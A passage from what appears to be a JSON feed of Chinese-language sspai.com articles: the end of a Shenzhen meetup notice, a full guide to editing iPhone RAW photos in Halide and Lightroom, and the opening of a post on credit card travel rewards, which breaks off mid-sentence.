src=\"https://cdn.sspai.com/2021/08/03/a035b3359e1aa053339854f0cbda964d.png\"></figure><h3><strong>佘璐芸</strong></h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/e9ad952c528d3e9e5ee6e2d0649c647d.png\"></figure><h3><strong>李欣然</strong></h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/e5b085251242132940451c1c7665160c.png\"></figure><h3><strong>十个小张</strong></h3>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/7c428ae46f6d57190616e6140a41de63.png\"></figure><h3><strong>谷逍驰</strong></h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/d3d145d9540bcf9d0e3e44996f37b5d2.png\"></figure><h2>活动详情</h2>\n<h3>活动时间与地点</h3>\n<p>2021 年 8 月 8 日（周日）14:00 ~ 17:00</p>\n<p>深圳市南山区深南大道 9007 号创新公社 OLAB 共生空间</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/d9879673d1684afb6e6bcc6e3a4480ab.jpg\"><figcaption>活动场地建筑物外观</figcaption></figure><h3>主要环节</h3>\n<ul>\n<li>现场签到</li>\n<li>开场：老麦</li>\n<li>嘉宾分享</li>\n<li>抽奖与合影</li>\n<li>各种极客好物自由参观</li>\n</ul>\n<h3>参与人数</h3>\n<p>由于场地限制，本次活动人数限定在 100 人内。</p>\n<p><strong>同时活动参与者需要提供健康码绿码方可进场，并请全程戴好口罩。</strong></p>\n<h3>门票及礼品</h3>\n<p>活动门票为 99 元，少数派 PRIME 可免费参加，需在报名页面填写相关信息审核通过后有效。</p>\n<p><a href=\"https://4571791480723.huodongxing.com/event/7609370473300\" target=\"_blank\">点击此处填写报名信息，</a>每位参与者还可获得：</p>\n<ul>\n<li>几素口袋小风扇</li>\n<li>素乐一次性口罩</li>\n<li>疫况湿巾</li>\n<li>少数派徽章</li>\n<li>tomtoc 帆布袋</li>\n<li>次世代极客芯片定制项链</li>\n<li>付费栏目优惠卡及相关贴纸</li>\n</ul>\n<p>除此之外，还有现场抽送的惊喜大奖，期待你的参与。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68056"},{"title":"从 RAW 照片到 Lightroom，这是我的手机摄影工作流","date":"2021-08-03 06:26:13","description":"\n<p>从我最初接触 iPhone 摄影<sup class=\"ss-footnote\" href=\"\" title=\"有一个很酷的词来专指这个爱好，即 iPhoneography。\" footnote-id=\"1\">1</sup>到现在已经过去了六七个年头，拍摄用的相机 app 和后期用的 app 都是用了不少。最后让我固定下来，并且基本确信不会再变的组合是相机 Halide + 后期 Adobe Lightroom。</p>\n<p>这个选择主要是基于我在两年前突然认识到 RAW 照片优异的质量。Halide 是一款非常简洁但功能强大的相机 app，它能让你控制 iPhone 在拍照时所能手动控制的各种参数。同时它还有非常强大的辅助功能，可以让你随时把控取景时的曝光和对焦情况。本文会在第一节浅谈 RAW 照片的基础知识，关于如何使用 Halide 拍摄 RAW 格式照片，可以参看 <a href=\"https://sspai.com/post/63288\">这篇文章</a>。</p>\n<p>用 iPhone 拍摄或许是一种无奈的选择，我也基本没有用过真正的单反相机。但手机摄影独具便捷和亲民的特点，让我相信有更多读者希望能优化自己的 iPhone 摄影工作流，而这也正是这篇文章诞生的意义。</p>\n<h2>在谈修图之前，我们先来聊聊 RAW</h2>\n<p>我先谈一下对 RAW 照片的认识。</p>\n<p>在一些相机 app 中会有一个 RAW 模式的开关。如果你打开这个开关，那么这个 app 就会默认拍摄 RAW 照片。RAW 不是一种固定的文件格式，而是表明你的照片不会经过自动处理，只尽可能保留拍摄时获取到的所有光学信息，各个相机厂商拍出的 RAW 照片格式也各有不同。一般来说，iPhone 上的第三方相机 app 拍摄的 RAW 照片是 DNG 格式<sup class=\"ss-footnote\" href=\"\" title=\"DNG 是 digital negative，即数字底片的缩写，很形象的说法。\" footnote-id=\"2\">2</sup>的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/5e7aaa7429cd82c0e6a6ea1747bfeb3d.jpeg\"><figcaption>Halide Camera app 的 RAW 模式开关按钮</figcaption></figure><p>「计算摄影」这个概念在近来被强调得越来越多。简单来说，在你每一次拍照时，你的手机都会进行大量的运算，来对你的拍摄结果做一个自动的调整，平衡各个区域的亮度和色彩，让它看起来更加鲜活。对于智能手机这样一个具有一定运算力的设备来说，出色的摄影算法能在很大程度上弥补相机光学元件的不足。</p>\n<p>乍得一听，你可能会觉得这非常「划算」。但事实上，计算摄影常常会在处理过程中进行大量的压缩，于是我们最终得到的成品图会丢失大量的，拍摄时获取到的光学信息。所以，当你放大一张经过如此处理的照片后，你会看到很难看的细节部位，这种难看通常被称为「涂抹感」（下面的对比图都对焦在同一点，并经过了 Lightroom 的自动调整处理）：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/b5f1d1e3bac6f11f48dc1c939348a894.png\"><figcaption>左：JPG，右：RAW（DNG）</figcaption></figure><p>更糟糕的是，这种计算摄影的流程通常是不可逆的。如果你觉得它调整得不好或者不足，那信息的丢失也会让你很难对这张图进行后期加工。</p>\n<p>所以，如果我出于审美相关的目的，希望拍一张有后期空间的照片，那么我常常会选择 RAW。一张 RAW 照片能最大程度地保留照片的细节信息。另外，虽然没有 HDR 加持，但 RAW 照片本身就能保留更多的光线信息，所以也能得到可观的动态范围。</p>\n<p>当然也有不适合拍摄 RAW 照片的情况。比如，拿我的 iPhone XR 来说，在低光环境下，Halide 的自动曝光算法经常会优先增加曝光时间，导致高光过曝的同时还会使运动中的物体拖出虚影（拍虚）。这时，iPhone 自带相机的计算摄影反倒是能让你轻而易举地拍出一张曝光正合适且能用的照片。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/7914ecf17ec6d04bd22ce1b0a63bbee2.png\"><figcaption>左：JPG，右：RAW（DNG）</figcaption></figure><p>可以看到，左侧「计算摄影」得到的图片相比右边的 RAW，减少了大量的噪声，但牺牲了一定的清晰度（比如地砖的纹理）。另一方面，右边的 RAW 图片导出后可以看到又大又硬的颗粒状噪声。</p>\n<h2>手机端的 RAW 照片后期处理——Adobe Lightroom</h2>\n<p>你可能听过「直出」这个词。对于用手机拍摄的自拍照片，或许「直出」意味着不磨皮不美颜等等。但是，对于 RAW 直出，完全没有后期也就意味着你的照片完全没法看。在下面的例子中你会看到这种情况。</p>\n<p>前面已经提到， RAW 照片的文件格式不同于我们常见的 JPEG 或者 HEIF，这导致许多常见的照片编辑 app 无法编辑甚至无法打开 RAW 照片。此外，为了编辑 JPEG 和 HEIF 格式照片而设计的后期工具也常常会在编辑 RAW 照片时显得力不从心（从调整的效果和运行效率来看）。在这种情况下，原生支持 RAW 格式处理的 Adobe Lightroom for Mobile 成为了我在手机端进行照片后期的最终选择。</p>\n<p>一句话概括 Lightroom：<strong>如果你需要处理照片的后期工作，那它什么都能做</strong>。</p>\n<p>我选择「修图」app 的历程可谓曲折。在我的选择最后固定在 Lightroom 上之前，我主要用 VSCO 和 SKRWT。前者大名鼎鼎不用多说，后者是一个专门用来调整照片透视（perspective）的工具，相当简洁好用。</p>\n<p>后来我突然发现了 DNG 照片可观的后期空间和未压缩的画质。作为 iPhone 上当时唯一能有效处理 DNG 格式的 app，Lightroom 也就成了我的选择。通过订阅 Adobe Creative Cloud，我也解锁了 iPad 和 Mac 版本 Lightroom CC 的全部功能，还有 1TB 的云同步空间。</p>\n<p>不仅如此，连 VSCO 都给 Lightroom 开发了一套预设。事实上，这套名叫 VSCO Films 的预设曾经是 VSCO 公司的主业。对于深受 VSCO 审美观影响的我来说，Lightroom 不仅没有带来切换工具的陌生感，还让我有了编辑<strong>每一个预设的每一个参数</strong>的选择权。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/7369371c382bddc61a035972831cae05.png\"><figcaption>VSCO Film 曾经的商店页面</figcaption></figure><p>当然，我也不总是预设来处理照片。多年的修图经验让我很快上手了 Lightroom 的强大功能。说实话，我还从来没有过试用之后觉得如此爱不释手的 app，甚至一度为了跨区无法付费想掏钱掏不出去而苦恼不已。</p>\n<h3>我的 Adobe Lightroom 修图流程</h3>\n<p>在 Lightroom 中导入一张照片后，你会看到大量可以调整的参数。这些滑块分工明确，协同作用的时候更是相当复杂，但是如果你对你的原片有个大致的期望，那么这些调整工具的协同作用将如同魔法。比如下面这张图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/6c202739f119e80203839c32149b55ca.jpg\"><figcaption>未经调整的原片，是坐车路过这座桥时歪歪扭扭的抓拍</figcaption></figure><p>在 Lightroom 中经过重度后期，它成了这样：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/0efcbd238e9ecdd7e41c0ee0ab8cf79c.jpeg\"><figcaption>最终成品</figcaption></figure><p>为了不把修图过程写得过于无聊，但又能展示 Lightroom 都能做些什么，我就简明地解释一下我对这张图片做过什么。下面是 Lightroom 的功能菜单，它们被分成三组：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/109aee9c7bc87ca69afec58a3c31fdcc.png\"><figcaption>Lightroom 的大菜单</figcaption></figure><p>我们不急着展开来讲，因为，如果你没有实际需求，那么这些选项看起来会非常复杂。我们结合例子来说。</p>\n<p>就像你看到的那样，这张 RAW 原片看起来非常的黯淡，而且根本看不到什么值得突出的主体（其实我是想拍远处的雪山，但是我的 iPhone XR 只有一个广角镜头）。</p>\n<p>这时候有两件首先要做的事，第一是按一下「自动」按钮，让 Lightroom 用自己的 AI 来帮你把这张图的光线变得稍微鲜活平衡一些。对于一些光线明暗区间很大的图像，这个「自动」功能会尽可能帮你把亮到刺眼的部分调暗一些，并把暗到看不见的部分调亮一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/0fce974a3f6ee6814928d1bc7ced3e8d.jpg\"><figcaption>使用「自动」功能前后</figcaption></figure><p>接着是把你想要凸显的主体部分给裁剪出来。对于这张图来说是后方的雪山。当然，对于这张仓促抓拍的图来说，还有一个问题是，它的视角是歪的。我们希望把它调正，也就是说，让马路崖、道路标线和水平线同时平行。在 Lightroom 的「几何」菜单里，你可以找到你需要的选项。调整它们，效果是这样：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/c8fb9ca1269359532d22cdc4ba579c92.GIF\"><figcaption>是不是还是感觉有点抽象？</figcaption></figure><p>对于这个「怎么都调不好」的问题，Lightroom 的解决方案是，辅助线。像这样：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/1b004e004b5f00179c892e95636f7484.GIF\"><figcaption>用辅助线功能校正透视</figcaption></figure><p>所以它几乎能完成 SKRWT 的工作。调正之后是这样：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/25696f66a5e81baa4b7b5080a86c17e1.jpg\"><figcaption>透视校正后</figcaption></figure><p>接着就是各种常规调整：曝光、曲线、对比度、分离色调、锐化等等。因为这些功能在调整细节的时候显得过于抽象，在这里我通过一些比较明显的情境来讨论几个参数，举个例子。</p>\n<p>首先我们看一下预设。所谓预设，字面意思就是已经打包好的一系列调整，你可以直接把它应用到你的图片。这里<sup class=\"ss-footnote\" href=\"\" title=\"Lightroom 在 iPhone 上同时支持横屏和竖屏。为了排版的紧凑，接下来我尽可能使用横屏进行演示，但是喜欢竖屏单手操作的朋友可以完全放心。\" footnote-id=\"3\">3</sup>我用的是 VSCO 在它们的移动 app 大获成功之后推出的模拟移动预设的预设包 VSCO Mobile Presets 02：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/55be1d96e9f446a254eb68407deb6193.GIF\"><figcaption>应用预设</figcaption></figure><p>一般说来，用预设来模拟一款胶片的效果是很现实的，比如</p>\n<ul>\n<li>\n<strong>胶片的色偏</strong>可以用固定的白平衡、色偏（tint）、高光和阴影的分级调节（grading）、分离色调调节等参数来实现。</li>\n<li>\n<strong>对不同强度光线的光学灵敏度</strong>可以用固定的高光、阴影、黑白色阶、曲线等参数来实现。</li>\n<li>\n<strong>噪点</strong>可以用「颗粒」效果实现。</li>\n</ul>\n<p>因为应用预设后，光线的调整可能会导致整张图片的动态范围<sup class=\"ss-footnote\" href=\"\" title=\"大致可以理解为：对于同一张图，动态范围提高可以使得最亮的地方不刺眼，最暗的地方看得清。\" footnote-id=\"4\">4</sup>变得很糟糕，这里我们再用一次「自动」，以方便我们进一步的调整：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/47052e59e9006d6fa1e3777a6d475a2e.jpg\"><figcaption>应用预设并自动调整后</figcaption></figure><p>这时我认为上方天空的蓝色过于偏绿且饱和度很高，很妖艳；同时，下方的绿色和土黄色让整张图显得很乱，也不利于突出雪山（主体）。这里我就直接用分离色调工具来调整：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/e748b730d16bcee5f66527861edc1682.GIF\"><figcaption>分离色调调整</figcaption></figure><p>这时，下半部分的黄色和绿色调依然非常抢眼。这时可以用「选择性编辑」来调整照片的某一个特定部分。有三种选择编辑区域的形状：自定义画笔、椭圆形和线性渐变。在这个例子中，因为我们需要调整的部分和不需要调整的部分之间有直线型的分界线，所以我们使用线性渐变：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/b2e3da87936d0de8e2113dd790a9a86c.GIF\"><figcaption>线性渐变功能，属于「选择性调整」工具</figcaption></figure><p>可以看到，这样调整之后的效果已经非常类似最终的成品，我也就不再展示其它微调了（其实是 15s 的录屏转 GIF 时长限制实在难受）。其他的调整包括大幅减少自然饱和度（vibrance）和饱和度、提高清晰度（clarity）和除雾效果（dehaze）、增加小尺寸噪点、锐化等等。</p>\n<p>技术不佳的我似乎也无法复现当时的编辑结果。这时利用「版本」工具，就可以快速地应用之前的调整，甚至还包括一些 Lightroom 认为大幅调整后值得保存的版本：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/e16a024395432a1d6ebcd729cb503541.GIF\"><figcaption>版本和自动版本</figcaption></figure><h2>整体来看，是什么让 Lightroom 更优秀？</h2>\n<p>因为我主要在手机和 iPad 上用 Lightroom，所以我会格外留意它的移动 app 究竟是不是精致易用，又足够强大。事实上，Lightroom 也很少让我失望。接下来我从「功能是否强大」、「上手是否容易」、「操作是否便利」三个方面来讨论 Lightroom 究竟为什么让我如此爱不释手。</p>\n<h3>强大而丰富的功能</h3>\n<p>首先来看 Lightroom 是不是拥有足够强大的功能。</p>\n<p>一款摄影后期 app 主要被「除了基础功能以外的其他功能」定义。比如，你在任何能够调整图片的工具中都能看到调整曝光、对比度、高光和阴影的滑块。这时，如果一款 app 还支持更全局而底层的调整，比如曲线，那么需要这一功能用户就会转而使用这款支持曲线的 app。</p>\n<p>Lightroom 的基础功能或许就已经能够胜任大多数的手机摄影，而且还是免费的（之后我们会单独介绍免费功能）。曾经一直使用 VSCO 的我于是也就几乎没有经历工具转换的顿挫感。但是，随着使用的深入和对图像调整要求的增加，Lightroom 能提供的调整参数可谓是覆盖了一张图的方方面面，能让你从各种角度，用各种手段，来把一张照片变成你喜欢的样子。</p>\n<p>我来举例说明一下 Lightroom 覆盖的功能范围有多么广：</p>\n<p><strong>修复功能</strong>：包括所谓的修复画笔和仿制图章功能，能让用户根据自己的需要，移除或者遮盖图像中不需要的主体，比如乱入取景框的路人。Lightroom 会自动帮你匹配环境色和光线。或许是为了尽可能少地牺牲图像质量而保留图像细节，Lightroom 的这个修复功能或许不如一些基于 AI 的工具那么「智能」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/fe511a4f82603a67bd75e016d6aa4619.gif\"></figure><p><strong>曲线和分离色调曲线</strong>：可以允许用户精确地修改每个亮度范围在图中的表现，还可以分别对 RGB 三个成分进行调整（转换动图的过程会减少颜色数目，但是也大概能看出调整曲线对图像的影响）：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/1f26bf3a8029b47db160441586b5aeed.GIF\"></figure><p>如果用一个简单的例子来解释曲线的作用：把最暗部变得最亮，而把最亮部变得最暗，你就可以得到一张负片。</p>\n<p><strong>颜色分级控制</strong>：允许用户分别调整高光、中调和阴影部分的色偏及其饱和度。当然，你可以自己决定多亮的部分算是高光，多暗的地方算是阴影：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/923eded46914dc0a30ffd653c0af9c6f.GIF\"><figcaption>颜色分级控制</figcaption></figure><p>在上面这个例子里，我给「中间色调」，即「既不太亮，也不太暗」的部分给予红色的色偏，然后利用「平衡」参数来改变系统对「什么亮度算是中间色调」的认识。</p>\n<p><strong>颜色混合</strong>：也就是分离色调调整，分别调整图中红、橙、黄、绿、天蓝、靛蓝、紫、品红色的色偏、亮度和饱和度。只保留一个颜色的饱和度就可以获得这种效果：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/889f81c4faf6a534bce6fde986c52306.GIF\"><figcaption>颜色混合功能</figcaption></figure><p>如果你难以决定你想要调整的主体究竟属于什么色调，目标调整功能能让你直接通过在该物体上拉动就改变它的色调：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/f60258ea87f3ec88a5f9f886e4ff7934.GIF\"></figure><p><strong>增加噪声</strong>：位于「效果」选项卡内，允许用户控制早点的数量、颗粒大小和锋利度。</p>\n<p><strong>减少噪声</strong>：位于「细节」选项卡内，允许用户控制降噪的程度、被移除噪声的范围和对比度。同时，「减少杂色」功能作为降噪的补充，允许用户在移除细节部分的噪点的颜色的同时保留噪点本身。</p>\n<p><strong>水印</strong>：允许用户在导出时向任意位置加入文字或图像水印，支持设置字体、字号、透明度等参数。它让用户既可以加入普通的文字水印（下图左），又可以加入提前准备好的这种基于任意自制图片的，或许可以密密麻麻（丧心病狂）的水印（下图右）：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/2617b2d8358e42b6ebec22db870142bf.png\"><figcaption>自定义水印功能</figcaption></figure><p>这些功能或许说大不大，但是市面上的确有单独拎出其中一个，就能做出十分精致而强大的 app 的例子。比如消除照片噪声的 CleanPics、专门为照片加水印的 Impression<sup class=\"ss-footnote\" href=\"\" title=\"这个 app 做得超级简洁精致，简直就是我内心中的完美讨喜 app。\" footnote-id=\"5\">5</sup>，还有若干年前红极一时但是我忘了名字的可以只保留彩色照片里某一个单独色调的 app。</p>\n<h3>新用户友好性</h3>\n<p>加上对预设的支持和市面上众多的预设包，Lightroom 在新用户友好性方面可以说是做得非常人性化。一般来说，一位从没有用过一款 app 的用户在刚上手时可能不知道该去使用哪些参数，而 Lightroom 在这方面做得十分友好：你只要按一下「自动调整」，Lightroom 就会在自动调整的同时把调整过的参数都给展示出来：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/80e823117522c423113e145206761c0c.png\"><figcaption>注意自动调整过的选项都被用小白点标注了出来</figcaption></figure><p>对于新用户来说，一款需要订阅的付费 app 如果想要吸引注意力，那就需要让用户试用到一定深度的功能，而 <strong>Lightroom 的免费功能简直强大到可怕</strong>：除了前面展示过的「选择性调整」、修复功能和视角调整外，其他的功能都是免费的。可以说，就算不付费，你也能够用到远远优于 App Store 绝大多数摄影后期 app 的强大功能。</p>\n<h3>在小屏幕上的表现</h3>\n<p>作为一款全平台通用的 app，Lightroom 的手机版会对一些参数的调整滑块的便利性提供特殊的优化。比如在调整「锐化」参数时，我们经常会担心：如果使用不慎，它会把照片本就有的噪点给进一步加深。这时，我们可以改变「锐化半径」参数，来让 Lightroom 忽略一些最细小的元素，从而不会放大噪声。值得一说的是，如果你用两根手指来操作这个滑块，你会惊叹 Lightroom 在操作人性化方面作出的努力：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/d082668359d6d8511e375c4d86486dbe.gif\"><figcaption>两只手指操作滑块时的功能预览</figcaption></figure><p>在上面的操作中，第一次移动滑块是用一只手指，第二次使用两只手指。可以看到，在手机这样的小屏幕上很难即时看清楚锐化的效果，从而对锐化半径是否合适做出评估，但是如果你用两只手指调整滑块，Lightroom 将会提供一幅非常清晰的示意图，告诉你什么地方被锐化了，什么地方在调整中保持了原样。这样的设计不仅有利于老用户快速准确地调整这些细节参数，还有利于新用户对每个参数功能的察觉。</p>\n<h2>想要好好做后期的我，也适合 Lightroom 吗？</h2>\n<p>如果你想同时解锁移动和桌面平台的 Adobe Lightroom CC，那订阅价格是每个月 10 美元（港区为 68 港币）<sup class=\"ss-footnote\" href=\"\" title=\"如果你通过手机订阅，则无法解锁桌面版，价格会相对便宜一些。\" footnote-id=\"6\">6</sup>，价格算不上便宜。如果你已经用过 VSCO、Snapseed、Darkroom 或者 Pixelmator Photo 这样的 app，同时觉得它们在功能或者导出图像质量这些方面满足不了你的需求，那给 Lightroom 课金是一个可行的选择。但是如果你之前就很少接触过照片后期，不太明白一些需要手动调整的参数都是在做什么，那或许 Lightroom 还暂时不是你的最佳选择。</p>\n<p>此外再加一点提醒：想要付费解锁全部功能，尤其是云同步功能的话，最好不要使用大陆区的 Adobe 账号。可以考虑利用外区的 Apple ID + 充值卡的支付方式来订阅。而且经验表明，一旦你的 Apple ID 已经给一个 Adobe 账号付过费，但想要解开绑定的话，Apple 和 Adobe 会互相推卸责任，最后你很可能会多次联系两边客服而无果。请格外留意这个坑。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67922"},{"title":"接送机、贵宾厅、星级酒店…… 聊聊我如何用信用卡「薅羊毛」","date":"2021-08-03 03:30:03","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p><strong>提醒：</strong></p>\n<ul>\n<li>❌：如果你每次旅行，坐头等/公务舱，有专用司机，只选最贵的酒店住，吃最好的餐厅，请大佬点击关闭按钮；</li>\n<li>✅：如果你是旅行中负责做攻略的那个，建议你抽 10 分钟看一下，并点击收藏。</li>\n<li>✅：如果你是信用卡无用论者，非常建议你看一看，我希望能说服你。</li>\n<li>⚠️：配图的卡片部分已作废，部分做了处理，有心人就不要浪费时间去尝试了</li>\n<li>⚠️：我跟夫人践行「信用卡当储蓄卡用」的理念，并不存在过度消费，也希望你也认同这样的理念。</li>\n</ul>\n<h2>我为什么喜欢旅行？</h2>\n<blockquote><p>没有调查，就没有发言权——毛主席</p></blockquote>\n<p>旅行迷人之处在于「未知」，你永远不知道，西安羊肉泡馍里有没有你讨厌的羊骚味，不知道拉萨的高反会让你彻夜难眠，不知道顺德的早茶原来真的跟传说中一样好吃，更不知道香港的很多人也可以非常奈斯。这是刷抖音、看帖子所无法获得的。但我的工作，有限的收入，有限的时间，令我无法去肆意的享受探索世界的快乐，这也是我写下此文的目的，尽可能的节约旅行支出、时间，最有效率的去体验这个奇妙的世界。话不多说，让我们开始吧！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/01/dc455dd5bc27f50a4f8fee9b6fe93344.jpg\"><figcaption>「广州：遥望倩影」</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/01/771bf9875971543e9e7fb6c790c467b5.jpg\"><figcaption>「寻味顺德：早茶」</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/01/f49f0f6a08dce655c36d2ec14eb3bb9d.jpg\"><figcaption>「HEM：安藤忠雄的双螺旋」</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/01/c23ce58c6142be91aa4e88363924bc5c.jpg\"><figcaption>「兰亭安麓：居于山水之间」</figcaption></figure><h3>回忆：以前的我是怎么旅行的？</h3>\n<p>很想笑～印象最深的一次旅行，应该是 2015 年的时候吧，我跟当时还是恋人的夫人一起去西安。那个时候我俩巨穷，没舍得打出租车，就跟着导航步行去大唐芙蓉园，在外围硬生生走了好多公里，脚都裂了，进去了以后只是机械的拖着沉重的步伐，完全没剩余精力去欣赏这个庞大而精美的艺术品。至于费用全程怎么抠怎么来，打车？这辈子都不会打车的好吗。所以费用也低得可怕，完美的诠释了什么叫做「穷游」，来回飞机，5 天，购买礼品，两个人一共就花了 3600 块，至今难以忘怀。</p>\n<p>用现在的眼光来看当时的旅行，就觉得自己好傻。当时去西安的动机是因为来回机票双人只要 960 块，然后跟着携程里的简陋攻略，踩遍各大景点，把自己累个半死。从此以后，我发誓，再也不看这种攻略。</p>\n<h3>如今：现在的我是如何筹划旅行？</h3>\n<p>后来随着收入、见识的扩展，慢慢开始追求旅行品质。也就是从2017年开始，人生里第一张高端卡下卡，在薅羊毛的道路上一去不复返，顺带优化自己的出行效率、节约旅行费用、节省路途时间。前前后后去过香港（2018）、厦门（2018）、大阪（2019）、顺德（2021），吃、住、行都让夫人表示十分满意，也算是对这些年薅羊毛的肯定。</p>\n<h2>如何节约旅行费用？</h2>\n<p>旅行中的费用主要集中在机票、酒店、餐饮三个方面。而餐饮方面的预算压缩的可能性极小，反而极有可能超支。故而从机票、酒店下手，尽可能在保证舒适度的情况下压缩预算占比，腾出空间给餐饮，毕竟吃到肚子里的才是自己的嘛。</p>\n<h3>机票：里程兑换</h3>\n<p>相比于现金机票，因为多年薅羊毛，积攒了大量的航司里程，前些年购物、装修、结婚、生娃，大量的消费刚好赶上薅羊毛黄金年代的末期，所以累积了大量信用卡积分，转换成航司里程。用里程购票的好处显而易见：「白嫖」。里程票里数固定，可以提前换取节假日票规避巨额票价。我 6 月 23 号送外婆去天津养老，返程不想做高铁回来，在查看天津到杭州的机票后，清一色的奥凯航空的机票，时间巨差，价格也不便宜。果断去北京大兴坐东航，21 号晚上兑换的时候，东航每个航班都放了 5 张，支付 12000 里程 + 50 元税费后即可兑换，而当时的票价是 900+RMB。</p>\n<p>客观来说，里程票有三大缺陷：</p>\n<ul>\n<li>\n<strong>使用上不如现金票灵活</strong>：各航司放出的里程票数量有限</li>\n<li>\n<strong>玩法复杂</strong>：内地航司相对简单；其他航司例如亚洲万里通、BA等要复杂的多，要在短时间搞清楚放票的规律、玩法并不现实。</li>\n<li>\n<strong>累积主要靠消费</strong>：没有大量的消费，就没有大量的积分，就没有大量的里程。</li>\n</ul>\n<p>对于普通家庭来说不需要去刻意累积里程，毕竟这东西就跟货币一样，贬值不可避免，如果刚好你拥有足够的信用卡积分，又刚好你想去的城市有对应的航司里程票，那就果断的兑换吧。如今已经不是累积里程的黄金年代，各大银行纷纷削减里程兑换权益，削减上限，提高兑换比例，手段层出不穷。不过依然有部分银行在里程兑换上还有相当不错的表现，比如交行的红牛卡<sup class=\"ss-footnote\" href=\"\" title=\"此卡已停止发行\" footnote-id=\"1\">1</sup>有 5 倍积分，广发各种活动加持下也能获得不错的兑换比例以及上限。</p>\n<p>如果你有兴趣，可以到 <a href=\"https://www.flyert.com/forum.php?gid=57\" target=\"_blank\">飞客茶馆</a> 中对应航司板块学习。</p>\n<p>适合累积航司里程的卡片推荐：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/01/0ed738a34ffe3c6704ef87820ebda12d.png\"><figcaption>「浦发运通白金」</figcaption></figure><ul>\n<li>\n<strong>浦发「运通白金信用卡」</strong>：在 20W 存款加持下的，消费 48000 元可获得 20000 东航 / 国航 / 海航里程。</li>\n<li>\n<strong>广发「东航洲际联名信用卡」+「美国运通真情卡」</strong>：2020 年以来广发活动不断，「废」行真的不废。这两张卡的组合，配合广发活动，可以让你以超乎想象的比例兑换到 22000 东航里程 / 洲际积分</li>\n<li>\n<strong>中行冬奥白金</strong>：5 倍积分加持，获得 7:1 的兑换比例，中行积分用途广泛，值得持有</li>\n</ul>\n<h3>酒店：季度促销及积分兑换</h3>\n<p>首先，明确一个理念：<strong>节约酒店费用并不意味着要降低住宿品质。</strong></p>\n<p>我相信对于大多数人的观念来说，酒店是一个可以最大程度压缩预算的地方。毕竟出去玩，呆在酒店里的时间其实非常少。但我真诚地建议你，如果经济条件允许，希望你能对自己好一点。如果你的住宿预算在 300-400 